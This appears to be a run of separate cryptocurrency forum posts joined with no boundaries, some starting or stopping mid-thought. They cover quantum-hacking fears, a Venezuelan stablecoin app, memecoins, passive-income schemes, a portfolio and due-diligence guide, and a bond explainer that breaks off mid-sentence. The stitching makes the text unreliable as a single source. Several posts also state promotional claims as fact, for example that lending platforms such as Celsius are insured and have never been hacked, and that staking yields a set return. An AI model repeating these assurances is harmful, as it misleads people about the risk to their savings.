In fact, someone in possession of much less powerful quantum computing power can easily hack into Federal reserve and transfer out every dollar there, or hack into Bank of England and shut everything down. In other words, cryptocurrencies would not even be among the top threats, because much bigger and important threats would be easily taken over. If they had quantum computers, they wont be asking Apple to de-encrypt devices seized from criminals. If they have quantum computers that can reverse engineer the private keys to any BTC address, they wont bother recovering measly 60 BTC from the 80 BTC ransom, when they can just send BTC to zero by hacking and moving Satoshi coins, thus destroying BTC's narrative completely. Tl:dr - Its preposterous to suggest anything like this exists.

But after seeing the hundredth post on the frontpage talking about altcoins that have real use cases, I can't stop thinking about this one.You all know Venezuela, right? The country with space-high inflation rates, the one that /r/cryptocurrency says crypto adoption is feasible. Well, it's finally really happening.I'm Venezuelan, so let me explain some weird things about our economy. First, prices double every 3 months. Second, we don't have access to USD bank accounts in the country. And third, physical cash is scarce: Bolivares because you need a lot of them to pay for little, and USD because the 'dollarization' isn't official, small change simply doesn't exist (coins, for example). This creates the perfect variables for digital, exact payment. This is where the Reserve Protocol comes in.We have been using some digital payments app since a while ago, apps like Zelle, PayPal or Transferwise. The problem with those apps is that they often close accounts in Venezuela to avoid problems with the US government. Simply put, those companies just didn't want to deal with the problem that is Venezuela related legislation.Enter [Reserve.](https://reserve.org/) The team at Reserve created a stablecoin alongside an easy to use app for mainstream use. The app allows people to deposit Bolivares (the local currency) from their bank account and instantly exchange them for dollars (RSV stablecoins!). You might be thinking, well, that isn't that big of a deal, is it? Thing is, it is. Venezuelans can't just exchange Bol√≠vares to USD legally because there aren't any bank accounts in USD inside Venezuela. The only way to save in USD would be to open an account in Panam√° or risk your money getting lost in Zelle or PayPal. The app allows people to send RSV, pay with RSV, receive any crypto and convert it to RSV or Bolivares and so on. Reserve is literally saving people from hyperinflation.Well, why do I say mainstream crypto adoption is happening? Because people aren't paying in bolivares anymore. It is estimated that in 2020, 55% of transactions were made in foreign currency, and that number just keeps growing everyday. Now, the great part.**The Reserve app has more than 100k downloads.** **People are using** **crypto, not as a way to invest, not as a store of value, but as it was intended: a currency.**  And it's happening right in front of us, but we're too worried about the price going up or down so much that we missed the real reason crypto is here: to serve as a currency when fiat fails us.

Because they saw what happened with DOGE and bought into what they believed was 'the next DOGE', a new memecoin with a growing community that they thought could 'do what DOGE did'. And they were right! The early investors have made a lot of money with SHIB. However, after the BIG pump is over, do new investors want the coin that has already had the big pumps, or the newest memecoin that has the potential to do what that memecoin did? Memes die, and so do memecoins. How often do you see Ugandan Knuckles memes anymore?

If you did take some gains, I can only congratulate you, you probably did better than most of your student peers who are probably not fully aware of what crypto is.But be aware that once you make your first gains, there is something I call the 'casino effect'. It pushes you to take more and more risks. I think it can be even amplified as a student because most of you don't have yet a monthly income. I remember that each penny counts and insane gains can start turning your head. At the same time, you are in the period of your life when you need to make very important decisions.Lately, you might read about young Samsung employees quitting their jobs in South Korea thanks to millions of $ they earned in crypto. Or read cool posts about huge gains and lambo.And you might think there is no good reason to study anymore.Strangely there is not much about people ashamed of massive losses.My message is for you to keep in mind you must measure your risk. Crypto is great but who knows when the rollercoaster ends or when you will make bad moves (we all do). You can not rely only on that. Hopefully the recent dip made you realize that. Please treat your study as your top priority and crypto as a bonus. If you make it in crypto, that would be amazing.

Yes, it could keep going up and you'd miss out on those gains, but it could also go down and you'd lose everything. Once you've taken back your initial investment though, you are playing with free money.

'Hodl' is a stupid meme for newbs. I learned the hard way.So called 'fundamentals' ('solid team', 'awesome project', 'upcoming partnerships')  don't reflect the price in a company that received its funding before it has ever proven anything (that's the primary difference between an ICO and an IPO). ***Where my REQ marines at?***When this bull run is actually over (and personally i don't believe that it is yet), you probably won't come to accept it until your portfolio is sitting at 50% of its ATH and your 'stack' of crypto has become a 'bag' you're stuck holding 'until you reach XX number again--then you'll sell *for sure*.'Here's the reality: Once the bubble pops, every crash is going to seem like a 'dip' and every 'bounce' is going feel like a 'this is gentlemen.'  ***That's how frogs get boiled to death.***Here are some principles you need to keep in mind if you want to walk away from this bull run with a fat stack of cash:1. Recognize and accept that you won't sell the exact top, and that--subsequently--your portfolio's 'true value' is only what you sell it for--not what it's ATH was at one point.2. Pick a realistic sum (take your dream figure and subtract 50%) at which you're going to cash out a certain percentage--or all of it--and (here's the important part): ***STICK TO IT.***   1. This latter point is most crucial, because as the sum grows and actually hits that number you picked, you're going to be very tempted to leave it in 'just a little longer'. That's greed talking. If you ask Greed 'how much is enough?' the answer is always 'a little bit more.' Have discipline in this and you'll win. Let greed take over and you'll lose. *If you let greed govern your decisions in a bull market, then you'll let panic govern your decisions in a bear market.*3. You can't predict the future--so don't judge your past self for knowledge you have today. 'Why didn't i buy that coin?!?! it just mooned!' Or 'Why didn't i sell before it crashed?!' You know what happened yesterday because it's today--you can't get mad at yourself for not possessing today's knowledge on the day before yesterday.4. My final and **MOST IMPORTANT** point:   1. As I said before ***your portfolio is only worth what you actually sell it for***. So do **NOT** focus on ***how much it was*** or ***how much it could have been*** '-- if you make this mistake you will be dissatisfied at turning $1000 into $100,000. If you've only got a $1,000 right now, you're probably thinking 'of course i'd be happy with $100k!' -- but when you get there you'll be holding out for 200/300/1 million. In your greed, you won't be satisfied with an enormous return--especially if you keep thinking about how you could have had $1,000,000 if you just 'bought that dip' that no one saw coming or 'held xyz coin' a little bit longer.  ***Focus on what you have today--not what you might have tomorrow.***&#x200B;Crypto veterans what other wisdom do you want to add to this list?Edit: Some people here seem to think that because BTC is now worth $55k that it would have been dumb to sell at $20k...in 2017.

Some people try trading, while others just HODL and check the prices every 5 minutes. And even though many of us have made decent amounts, neither of these two ways can guarantee a reliable source of income.But what if I told you that apart from trading and holding, there are other ways that can make you money in the crypto space? Well, in this guide I have collected most of these methods so that you can pick out the ones you prefer, and start earning passive income with crypto.# #1 - StakingStaking is an activity where a user locks or holds his funds in a cryptocurrency wallet to participate in maintaining the operations of a proof-of-stake (PoS)-based blockchain system. It is similar to crypto mining in the sense that it helps a network achieve consensus while rewarding users who participate.Staking can be an excellent way to increase your cryptocurrency holdings with minimal effort. You can stake various cryptocurrencies such as DOT, ADA, AVAX etc. By doing this, you earn a certain APY (annual percentage yield), usually between 4%-25% depending on how long you are willing to lock your cryptos.You can either stake a coin from a wallet such as Exodus, or you can stake your coins on a few exchanges (e.g. Binance). As always, DYOR before locking your crypto for 30-60-90 or more days.# #2 - AirdropsAn airdrop, in the cryptocurrency business, is a marketing stunt that involves sending coins or tokens to wallet addresses in order to promote awareness of a new virtual currency. Small amounts of the new virtual currency are sent to the wallets of active members of the blockchain community for free or in return for a small service, such as retweeting a post sent by the company issuing the currency.The famous Uniswap airdrop made 49 million UNI claimable for users whose address has ever called the Uniswap v1 or v2 contracts. Each address could claim 400 UNI (worth ‚âà $7400), which is a nice sum for doing almost nothing.It is worth keeping an eye out for possible future airdrops, so make sure to follow the news! :)# #3 - Reddit MoonsMost of the users here already know, but for those who don't (and with a large influx of new members, it's possibly a lot of you guys), you can earn Moons for upvotes on this subreddit. But what are Moons?'Moons exist as ERC-20 tokens on the Ethereum blockchain, where they are managed by a suite of smart contracts that handle balances, transfers, distribution/claiming, and purchasing Special Memberships. The smart contracts and mobile apps have been reviewed and audited by Trail of Bits, an independent security firm with blockchain expertise.As blockchain tokens, Moons are independent of Reddit. Once you've earned them, neither Reddit nor moderators can take your Moons away or decide what you do with them. They're all yours.'In order to be able to claim your Moons, you'll need to download the Reddit mobile app and set up your vault (click on your icon at the top left of the home page).The main purpose for moons is to own a share of the community (vote on governance/distribution proposals) as well as redeem them for the premium membership, which allows you to change the color of your username, embed gifs in comments, add custom flair, etc.To sum it up, you earn Moons by commenting and posting - something that you'd normally do anyway. Just don't forget to create your vault!In case you want to, you have the option to sell your Moons. The current price of Moons is $0.071380 / coin (15/02/2021), and you can only sell your moons on Honeyswap at the moment.# #4 - Nexo, Celsius, etc.This method is very similar to what banks offer on your investment, except that on Nexo and Celsius you can earn up to 6-14% just by keeping your crypto, stablecoin or fiat on their site.While the saying 'not your keys, not your coins' is true, these companies are insured and have never been hacked before. As far as I know, both of these sites have a daily payout system, and you can deposit and withdraw funds whenever you want to.If you choose this method, it might be worth splitting your investment between these sites in order to prepare for the worst and also to be able to claim offers and bonuses on both sites once available.# #5 - Coinbase EarnNot a 'passive' method, but I felt like I should add this one to the list. Many of you are already familiar with the 'It ain't much, but it's honest work' meme referring to Coinbase Earn, a program where you can earn a few coins by watching educational videos of certain cryptocurrencies and solving the quizzes that follow said videos.In my country, currently Graph, Compound, XLM, CELO, Band, and Maker are available through Coinbase Earn, and if you complete all of these crypto's quizzes, you can earn up to $30-$40. In crypto, of course.Compared to the previous methods, it truly ain't much, but it's honest work, and who knows how these coins will perform in the upcoming years. Worth a shot!&#x200B;**If you have any other suggestions or feel like sharing your experience on passive income and cryptocurrencies, feel free to do that! :)**&#x200B;*The above references are an opinion and are for information purposes only.

I got into cryptocurrency at the beginning of COVID because I lost my job and there were no other jobs available, so I did some research and saw how fiat and will of governments are the major reason my people suffer this much and also how crypto can help bypass these restrictions.So, after doing research and calculating electricity costs and gains, I invested most of my savings into a small mining rig which ended up earning me more money per month than my previous job because the price of ETH got better. For reference I was making 110$ per month from my job, but I was earning roughly 160$ from mining every month. I found another job recently, but for quite some time, mining was my primary source of income. Now I roughly earn 300$ per month, mining + my job.Anyway the reason I brought this up was to show how little I was earning and how I still managed to invest in crypto. Usually investing requires a large amount of initial capital (Such as stocks and property), which many people don't have, but crypto doesn't have any such barrier. I started spending less and less on things I didn't really need. Smoking, drinking, occasional drug use (marijuana) and ordering food all the time. These can be anything, for me it was these things. Some people spend excessive money on collectible, games, clothing etc... So its up to each individual to find out what is their needless spending.I quit smoking, drugs and alcohol and started cooking more. This allowed me to invest around 1$ per day in BTC or coin of my choice. Sometimes I simply held onto my ETH instead of selling it, and sometimes I bought another coin. But as I said, it was around 30$ a month. It's basically nothing in terms of international value, but it was decent amount of money for me (inflation is a bitch) and now depending on the coin I invested in, I have profits in almost all of them. Even though I convert most of my mining into fiat to spend on bills and costs of living, every investment I made I've been hodling ever since. It didn't make me rich or anything, but now I have basically tripled my investments and have more in savings than I ever did.Which one are you more likely to regret more:1. I could have spent the whole year smoking and drinking, and eating bad food, but I didn't2. I could have spent the whole year investing in crypto and living a healthier life, but I didn'tIn fact, with my savings, I would feel less terrible for indulging in things I quit now and then, because its no longer a big economic drain like it used to be and we are all human, so we do deserve some leisure spending. Its all thanks to that crucial year of investing.I recommend everyone to do their own research, but I still believe it's early enough to invest a small amount of your income in crypto every month, hodl and see profits long term. My mother thinks I am some kind of genius for tripling our savings, but she simply doesn't understand the concept of crypto. In reality, I was just following crypto info on my 2nd monitor while gaming and not spending money on things I didn't need. I am no genius. Crypto simply provides investment opportunities to people who don't have large initial capital to invest in traditional investment avenues.I hope this has been helpful to other people with low income, specially others who are also from countries that have unstable economy and inflated currencies. Even 1%-5% of your monthly income in crypto is a good long term investment, but as always do your own research and pick your coins. I didn't do 'day trading' or try to invest in new coins, hoping they would go up. I mainly invested in coins that were solid already. I would suggest the same for fellow low income investors. In the end this has been my experience, and I thought I should share it. And don't forget, this is just for one year. The more we hold, the better. Finally, even if we don't make it, we have merely sacrificed unnecessary things in our lives, we still have the friends and connections we made along the way.P.S: Happy new year and Nowruz to everyone who follow Iranian/Zoroastrian solar calendar around the world! The equinox is upon us and spring has sprung! Happy first day of spring.Edit: Thanks a lot for all the rewards and support!

What do you do now? In the following weeks it will be a good time to rethink your investment approach and how you arrive at your decisions. Just buying whatever is shilled on Twitter or Reddit and jumping from one crypto to another isn't going to work like it did these last two months. The good news is that we're finally back closer and closer to our long term moving average which is much more healthy for entrants, the bad news is that the fear might continue compounding if outstanding issues are not dealt with.

Nobody really knows where the bottom is but I think we're now past the 'irrational exhuberance' stage and we're entering a period of more serious inspection where cryptos will actually have to prove themselves as useful. I suspect hype artists like CryptoNick and John McAfee will fall out of favor.But perhaps most importantly use this as a learning experience, don't try to point fingers now. The type of dumb behavior that people were engaging in that was rewarded in a bull market (chasing pumps, going all in on a shillcoin, following hype..etc) could only ever lead to what we are experiencing now. Just like so many people jumped on the crypto bandwagon during the bull run, they will just as quickly jump on whatever bandwagon is to be used to blame for the deflation of the bubble. Nobody who pumped money into garbage without any use case will accept that they themselves with their own investing behavior were the real reason for the gross overvaluation of most cryptocurrencies, and the inevitable crash.So if you're looking for a fresh start after the massacre (or just want to get in now), here is a guide:#Part A: Making a Investment Strategy---------------------------This is your money, put some effort into investing it with an actual strategy. Some simple yet essential advice that should apply to everyone, regardless of individual strategy:1. Slow down and research each crypto that you're buying for at least a week.2. Don't buy something just because it has risen.3. Don't exit a position just because it has declined.4. Invest only as much as you can afford to lose.5. Prepare enter and exit strategies in advance. First take some time to think about your ROI target, set your hold periods for each position and how much you are actually ready to risk losing.**ROI targets**A lot of young investors who are in crypto have unrealistic expectations about returns and risk. A lot of them have never invested in any other type of financial asset, and hence many seem to consider a 5-10% ROI in a month to be unexciting. But its important to temper your hype and realize why we had this exponential growth in the last year and how unlikely it is that we see 10x returns in the next year. What we saw recently was [Greater Fool Theory](https://en.wikipedia.org/wiki/Greater_fool_theory) in action. Those unexciting returns of 5-10% a month are much more of the norm, and much more healthy for an alternative investment class. You can think about setting a target in terms of the market ROI over a relevant holding period and then add or decrease based on your own risk profile.**Example: Calculating a 2 year ROI target**Lets say you want to hold for 2 years now, how could you set a realistic target to strive for? You could look at a historical 2 year return as a base, preferably during a period similar to what we're facing now. Now that we had a major correction, I think we can look at the two year period starting in 2015 after we had the 2014 crash. To calculate a 2 year CAGR starting in 2015:Year  | Total Crypto Market Cap -------|------Jan 1, 2015:|  $5.5 billion Jan 1, 2017:  | $18 billionCompounded annual growth return (CAGR):  [(18/5.5)^(1/2)]-1 = 81%This annual return rate of 81% comes out to about 4.9% compounded monthly. This may not sound exciting to the lambo moon crowd, but it will keep you grounded in reality. You can aim for a higher return (say 2x of that 81% rate) if you choose to take on more risky propositions. I can't tell you what return target you should set for yourself, but just make sure its not depended on you needing to achieve continual near vertical parabolic price action in small cap shillcoins because that isn't sustainable. Once you have a target you can construct your risk profile (low risk vs. high risk category coins) in your portfolio based on your target.**Risk Management**Everything you buy in crypto is risky, but it still helps to think of these 3 risk categories:* Core holdings - This is the exchange pairing cryptos and those that are well established. These are almost sure to be around in 5 years, and will recover after any bear market. The Coinbase pairs (Bitcoin, Litecoin and Ethereum) are in this class of risk, and I would also argue Monero.* Medium Risk Speculative - These would be cryptos which generally have a working product and niche, but higher risk than Core. Things like ZCash and Ripple, relatively established history but still uncertainty over long term viability.* High Risk Speculative - This is anything created within the last few months, ICOs, low caps, shillcoins...etc. Most cryptos are in this category.How much risk should you take on? That depends on your own life situation for one, but also it should be proportional to how much expertise you have in both financial analysis and technology. The general starting point I would recommend is: * 50-70% for newbies in Low Risk Core, then you can go down to 30% as you gains confidence and experience* Always try to keep at least a 1/3rd in safe core positions* Don't go all in on speculative picks.Some more core principles on risk management to consider:* Diversify across sectors and rebalance your allocations periodically. * Consider using dollar cost averaging to enter a position. This generally means investing a X amount over several periods, instead of at once. You can also use downward biased dollar cost averaging to mitigate against downward risk. For example instead of investing $1000 at once in a position at market price, you can buy $500 at the market price today then set several limit orders at slightly lower intervals (for example $250 at 5% lower than market price, $250 at 10% lower than market price). This way your average cost of acquisition will be lower if the crypto happens to decline over the short term.* Don't have more than 5-10% of your net worth in crypto.* Have the majority of your holdings in things you feel good holding for at least 2 years. Don't use the majority of your investment for day trading or short term investing.* Remember you didn't actually make any money until you take some profits, so take do some profits when everyone else is at peak FOMO-ing mode.* Have some fiat in reserve at a FDIC-insured exchange (ex. Gemini), and be ready to add to your winning positions on a pullback. This should be part of your entry strategy.* Consider what level of loss you can't accept in a position with a high risk factor, and use stop-limit orders to hedge against sudden crashes. Set you stop price at about 5-10% above your lowest limit. Stop-limit orders aren't perfect but they're better than having no hedging strategy for a risky microcap in case of some meltdown. Only you can determine what bags you are unwilling to hold.You can think of each crypto having a risk factor that is the summation of the general crypto market risk (Rm), but also its own inherent risk specific to its own goals (Ri).Rt = Rm +RiThe market risk is something you cannot avoid, it is essentially the risk that is carried by the entire market over things like regulations. What you can minimize though the Ri, the specific risks with your crypto. That will depend on the team composition, geographic risks (for example Chinese coins like NEO carry regulatory risks specific to China), competition within the space and likelihood of adoption and other factors, which I'll describe in Part 2: Crypto Picking Methodology.**Portfolio Allocation**Along with thinking about your portfolio in terms of risk categories described above, I really find it helpful to think about the segments you are in. [OnChainFX](http://onchainfx.com/) has some segment categorization but I generally like to bring it down to:* Core holdings - BTC, Ethereum, LTC...etc* Platform segment - Ethereum, NEO, Ark...etc* Privacy segment - Monero, Zcash, PivX..etc* Finance/Bank settlement segment - Ripple, Stellar...etc* Enterprise Blockchain solutions segment - VeChain, Walton, Factom...etc* Promising Tech segment - NANO/Raiblock, Cardano...etcThink about your ['Circle of Competence'](https://en.wikipedia.org/wiki/Circle_of_competence), your body of knowledge that allows you to evaluate an investment. Your ability to properly judge risk and potential is going to largely correlated to your understanding of the subject matter. If you don't know anything about how supply chains functions, how can you competently judge whether VeChain or WaltonChain will achieve adoption? If you don't understand anything about the tech when you read the Cardano paper, are you really able to determine how likely it is to be adopted?Consider the [historic correlations between your holdings](https://cointrading.ninja/correlation). Generally when Bitcoin pumps, altcoins dump but at what rate depends on the coin. When Bitcoin goes sideways we tend to see pumping in altcoins, while when Bitcoin goes down, everything goes down. You should diversify but really shouldn't be in much more than around 12 cryptos, because you simply don't have enough competency to accurately access the risk across every segment and for every type of crypto you come across. If you have over 20 different cryptos in your portfolio you should probably think about consolidating to a few sectors you understand well. #Part B: Crypto Picking Methodology (Due Dilligence)------------------------------------------Do you struggle on how to fundamentally analyze cryptocurrencies? Here is a 3-step methodology to follow to perform your due dilligence:# Step 1: Filtering and ResearchThere is so much out there that you can get overwhelmed. The best way to start is to think back to your own portfolio allocation strategy and what you would like to get more off. For example in my view enterprise-focused blockchain solutions will be important in the next few years, and so I look to create a list of various cryptos that are in that segment.[Upfolio has brief descriptions of the top 100 cryptos and is filterable by categories](https://www.upfolio.com/100-coins-explained), for example you can click the 'Enterprise' category and you have a neat list of VEN, FCT, WTC...etc.Once you have a list of potential candidates, its time to read about them:* Critically evaluate the website. If it's a cocktail of nonsensical buzzwords, if its unprofessional and poorly made, stay away. Always look for a roadmap, compare to what was actually delivered so far. Always check the team, try to find them on LinkedIn and what they did in the past. * Read the whitepaper or business development plan. You should fully understand how this crypto functions and how its trying to create value. If there is no use case or if the use case does not require or benefit from a blockchain, move on. * Check the blockchain explorer. How is the token distribution across accounts? Are the big accounts selling? Try to figure out who the whales are (not always easy!) and what the foundation/founder account is based on the initial allocation.* Look at the Github repos, does it look empty or is there plenty of activity?* Search out the subreddit and look at a few Medium or Steem blogs about the coin. How 'shilly' is the community, and how much engagement is there between developer and the community?* I would also go through the BitcoinTalk thread and Twitter mentions, judge both the length and quality of the discussion.You can actually filter out a lot of scams and bad investments by simply keeping your eye out on the following red flags:* allocations that give way too much to the founder* guaranteed promises of returns (Bitcooonnneeeect!)* vague whitepapers filled with buzzwords* vague timelines and no clear use case* Github with no useful code and sparse activity* a team that is difficult to find information on #Step 2: Passing a potential pick through a checklistOnce you feel fairly confident that a pick is worth analyzing further, run them through a standardized checklist of questions. This is one I use, you can add other questions yourself:Crypto Analysis Checklist |---------|What is the problem or transactional inefficiency the coin is trying to solve? |What is the Dev Team like? What is their track record? How are they funded, organized? |How big is the market they're targeting? |Who is their competition and what does it do better? |What is the roadmap they created and how well have they kept to it? |What current product exists? |How does the token/coin actually derive value for the holder? Is there a staking mechanism or is it transactional? |Is there any new tech, and is it informational or governance based? |Can it be easily copied? |What are the weaknesses or problems with this crypto?  |The last question is the most important. This is where the riskiness of your crypto is evaluated, the Ri I talked about above. Here you should be able to accurate place the crypto into one of the three risk categories. I also like to run through this checklist of blockchain benefits and consider which specific properties of the blockchain are being used by the specific crypto to provide some increased utility over the current transactional method:Benefits of Cryptocurrency |---------|Decentralization - no need for a third party to agree or validate transactions. |Transparency and trust - As blockchain are shared, everyone can see what transactions occur. Useful for something like an online casino. |Immutability - It is extremely difficult to change a transaction once its been put onto a blockchain |Distributed availability - The system is spread on thousands of nodes on a P2P network, so its difficult to take the system down. |Security - cryptographically secured transactions provide integrity |Simplification and consolidation - a blockchain can serve as a shared ledger in industries where multiple entities previously kept their own data sources |Quicker Settlement - In the financial industry when we're dealing with post-trade settlement, a blockchain can drastically increase the speed of verification |Cost - in some cases avoiding a third party verification would drastically reduce costs. |#Step 3: Create a valuation modelYou don't need to get into full modeling or have a financial background. Even a simple model that just tries to derive a valuation through relative terms will put you above most crypto investors. Some simple valuation methods that anyone can do:**Probablistic Scenario Valuation**This is all about thinking of scenarios and probability, a helpful exercise in itself. For example: Bill Miller, a prominent value investor, [wrote a probabilistic valuation case for Bitcoin in 2015](http://dev.lmminvestments.com/a-value-investors-case-for-bitcoin/). He looked at two possible scenarios for probabalistic valuation:1. becoming a store-of-value equal to gold (a $6.4 trillion value), with a .25% probability of occurring2.  replacing payment processors like VISA, MasterCard, etc. (a $350 million dollar value) with a 2.5% probabilityCombining those scenarios would give you the total expected market cap: (0.25% x 6.4 trillion) + (2.5% x 350 million). Divide this by the outstanding supply and you have your valuation.**Metcalfe's Law**[Metcalfe's Law](https://en.wikipedia.org/wiki/Metcalfe's_law) which states that the value of a network is proportional to the square of the number of connected users of the system (n^2). So you can compare various currencies based on their market cap and square of active users or traffic. We can alter this to crypto by thinking about it in terms of both users and transactions:For example, compare the Coinbase pairs:Metric | Bitoin | Ethereum  | Litecoin---------|----------|----------|----------Market Cap | $152 Billion | $93 Billion | $7.3 BillionDaily Transactions (last 24hrs) | 249,851| 1,051,427 | 70,397Active Addresses (Peak 1Yr) | 1,132,000 |1,035,000 | 514,000Metcalfe Ratio (Transactions Based)| 2.43 | 0.08 | 1.47Metcalfe Ratio (Address Based)| 0.12| 0.09 | 0.03Generally the higher the ratio, the higher the valuation given for each address/transaction.**Market Cap to Industry comparisons**Another easy one is simply looking at the total market for the industry that the coin is supposedly targeting and comparing it to the market cap of the coin. Think of the market cap not only with circulating supply like its shown on CMC but including total supply. For example the total supply for Dentacoin is 1,841,395,638,392, and when multiplied by its price in early January we get a market cap that is actually higher than the entire industry it aims to disrupt: Dentistry. **More complex valuation models**If you would like to get into more fleshed out models with Excel, I highly recommend Chris Burniske's blog about using Quantity Theory of Money to build an [equivalent of a DCF analysis for crypto](https://medium.com/@cburniske).[Here is an Excel file example of OMG done by Nodar Janashia using Chris' model ](https://docs.google.com/spreadsheets/d/1FvYGe0TA-rZR00iAV2PDI-B9zba6GpEG1FodECWJDys/edit). You should create multiple scenarios with multiple assumptions, both positive and negative. Have a base scenario and then moderately optimistic/pessimistic and highly optimistic/pessimistic scenario.Personally I like to see at least a 50% upward potential before investing from my moderately pessimistic scenario, but you can set your own safety margin.The real beneficial thing about modelling isn't even the price or valuation comparisons it spits out, but that it forces you to think about why the coin has value and what your own assumption about the future are. For example the discount rate you apply to the net present utility formula drastically affects the valuation, and it reflects your own assumptions of how risky the crypto is. What exactly would be a reasonable discount rate? What about the digital economy you are assuming for the coin, what levers affects its size and adoption and how likely are your assumptions to come true? You'll be a drastically more intelligent investor if you think about the fundamental variables that give your coin the market cap you think it should hold.#Summing it up------------------------------------------The time for lambo psychosis is over. But that's no reason to feel down, this is a new day and what many were waiting for. I've put together in one place here how to construct a portfolio allocation (taking into consideration risk and return targets), and how to go through a systematic crypto picking method. I'm won't tell you what to buy, you should always decide that for yourself and DYOR. But as long as you follow a rational and thorough methodology (feel free to modify anything I said above to suit your own needs) you will feel pretty good about your investments, even in times like these.

What I wrote ended up being more like an ELI12, and also ended up being quite long; in any case, I have decided to modify it a bit and turn it into its own post.# What are bondsFirst, an introduction on what bonds actually are.Simply put, a bond is the 'asset side' of governmental or corporate debt. When a government or corporation borrows money, the borrower now holds a liability, and the lender holds an asset, which is expected to return them their original investment (the money they lent) plus profit (interest) at some later date. A bond is basically a token that says some government or company owes you some amount of principal by some date known as the maturity date (usually 3 months to 30 years, depending on the type of bond), plus interest. Because bonds are a tokenization of debt, they can be easily traded in a liquid, open market, just like stocks. This means that the original lender does not need to be the person who is repaid when the bond matures; the repayment and interest simply goes to whomever holds the bond at the time.There are two main types of bonds: corporate bonds, and government bonds.Corporate bonds are the main way companies raise money, apart from selling shares.Government bonds are how the government raises money to cover budget deficits (ie: when the government spends more than they have the tax revenue to spend, they borrow the remainder by selling bonds to whomever will buy them). If nobody is buying the government bonds, the interest will go up organically due to supply and demand until people are willing to buy them. Government bonds are often known as **treasuries**, and are broken down into three categories: treasury bills (short-term maturity), treasury notes (mid-term maturity), and treasury bonds (long-term maturity).One of the main buyers of US government bonds is the Federal Reserve, which is the name of America's central bank. This is the entity that is able to actually print US dollars. Everyone has heard of things like how the US government recently ran huge deficits due to 'stimulus spending', and that it printed the money it needed for that spending. Well, this is a slightly inaccurate picture of how it works. The government chooses fiscal policy, which means they build the budget and they set the tax rates. They are the ones who choose to overspend and run a deficit. However, they don't choose monetary policy: they cannot print money. This power was delegated by congress to the Federal Reserve over 100 years ago.So, when the government runs a deficit, they sell bonds to borrow the money. If the FED chooses to, it can print a whole bunch of money and then lend that money to the government (ie: the taxpayer) by buying the government bonds with it. That is how newly printed money actually gets into the economy: the FED prints it and then lends it out to companies and to the government by buying corporate and government bonds. When the FED buys a bunch of treasuries (government bonds), it is really lending out freshly-printed cash to the American people (since the government's liabilities are really the taxpayers' liabilities), and the people then owe that money, with interest, back to the FED by the time the treasury matures.When the FED decides to buy up the government's bonds in order to lend to the taxpayers the money that congress is spending, they are also putting downward pressure on the bond interest rate. This is because, if the FED decided *not* to lend a bunch of money to the government to cover its deficits, the bond interest would organically rise through supply & demand until other buyers (individuals, companies, foreign investors, whatever) are willing to buy those bonds.So, when the FED wants to keep bond interest low, they achieve this indirectly by creating what is basically artificial demand for US bonds by buying a ton of them with money that they printed at no cost to themselves. Due to how supply & demand works with debt, the more demand there is for bonds, the lower the interest those bonds offer.So, the Federal Reserve executes its main task of managing the US bond rate by choosing how much government debt it buys. If they want bond rates to go up, they will print less cash and buy fewer bonds. If they want it to go down, they will print more cash and buy more bonds.The FED is essentially a whale with the power to print money, who uses said printed money to manipulate the US bond market, ostensibly for the good of everybody.# The risk-free rateThe interest rate on American government bonds is considered one of the most important variables in the American (and even worldwide) economy. This is because the American gov is considered the de-facto safest borrower of all borrowers in the world. In other words, if I buy an American government bond, I am lending my money to the entity that is considered to have the smallest risk of defaulting in the world (maybe this is arguable, but regardless this is a premise that is at the core of the world economy; what's important is that people believe it).There is a concept in economics called the 'risk-free rate'. This is the interest you can get for lending your money to a 0-risk borrower, and should logically be the lowest interest rate you see anywhere in that economy. Of course, there is always technically some risk when you lend money, so the risk-free rate is technically imaginary. However, in practice, just about everybody considers the US bond rate (specifically, treasury bills, the US bond with the shortest maturity) to be the risk-free rate, as the risk is considered to be so low as to be negligible.So, if buying American gov bonds is the safest way to lend money, it means that every single other form of loan must pay higher interest. Why? Because every other borrower is considered higher risk, and for me as a lender, I will not accept less interest for greater risk. So, if American bond interest goes up, all other loan interest (corporate bonds, bank loans, mortgages, credit cards, whatever) will organically go up, because everything must pay greater interest than American bonds to compensate for greater risk. This is simply a matter of supply & demand mechanics.So, American bond interest is kind of like the baseline or the 'sea level' for all interest rates in the entire economy. This even stretches to other countries, because anyone can buy a bond from the US gov, and they are considered the safest borrower in the world, so nobody will ever lend money to anybody else unless they are compensated with greater interest than US bond interest.# The cost of capitalSo, if US bond rates go up, and therefore all interest in the economy goes up, that means money itself has gotten more expensive. Loan interest is literally just the cost of money (known as the cost of capital). The lesser the interest, the cheaper it is for me to acquire money right now. When you realize that the entire world runs mainly on debt, it becomes clear how significant this phenomenon is.So, when US bond rates go up, the price of capital itself goes up. That means it becomes more costly for businesses to raise money, more costly to mortgage a house, more costly to open a line of credit to buy investments, more costly to spend with credit cards, more costly to use leverage in securities markets, etc.This means that growth goes down, spending goes down, wages go down, etc. It also means the prices of goods go down (or at least climb slower), because people aren't willing to pay as much, since capital itself is more expensive to acquire.What happens when prices go down? Well, that's a reduction in inflation. So, when inflation is getting too high, the FED (central bank) will make bond interest go up to apply recessive forces on the economy to curb said inflation.If inflation is low, the FED might reduce bond interest in order to make the cost of capital lower to juice the economy, prop up securities markets, and incentivize growth. Too much growth though, and we end up with inflation again, meaning the FED might increase rates again. This causes a sort of wave-like dance between bond rates and the heat of the economy.So, the FED influences bond rates ostensibly to keep the economy balanced: not too hot and inflationary (can be very bad) and not too cold and deflationary (also can be very bad).It is also worth noting that the FED wields a couple other levers it can use to increase or decrease the cost of capital (ie: the general interest rates in the economy) that are separate from bond rates. They can change the reserve requirements of banks (what percentage of total assets a bank must hold in reserve). If banks need to hold more in reserve, then they have less liquid money to lend out, so the supply of capital goes down, so market interest (cost of capital) rises. Also, the FED can change the discount rate, which is the amount of interest they charge banks for short-term loans (24 hours or less) from the FED itself.  When these rates go up, banks are disincentivized from borrowing from the FED, so the banks end up with less liquid capital, which means they need to be more conservative about the loans they themselves give out, which makes the supply of capital go down and thus the cost of capital go up.# What does this mean for markets?When bond rates go up, most investment markets go down. Why? Well, the higher bond rates go, the more I can make by investing in bonds, without the risk going up. So, as bond rates go up, it becomes more and more attractive to move my wealth out of riskier markets like stocks and into what is considered the safest investment market in the world: US bonds. Since rates going up means I get greater returns on my bond investments, but the risk doesn't change, US gov bonds become more and more sensible to an investor as the rates increase.Of course, bonds rates going up a smidgen doesn't actually suddenly make bonds a strategically more sound investment than riskier things like stocks. In fact, US bond rates have been so comically low for so long that it hasn't made much sense to buy bonds in years (decades, really). However, when people hear that the FED is going to increase bond rates, they think 'bond rates going up means people will sell stocks to buy bonds, so I 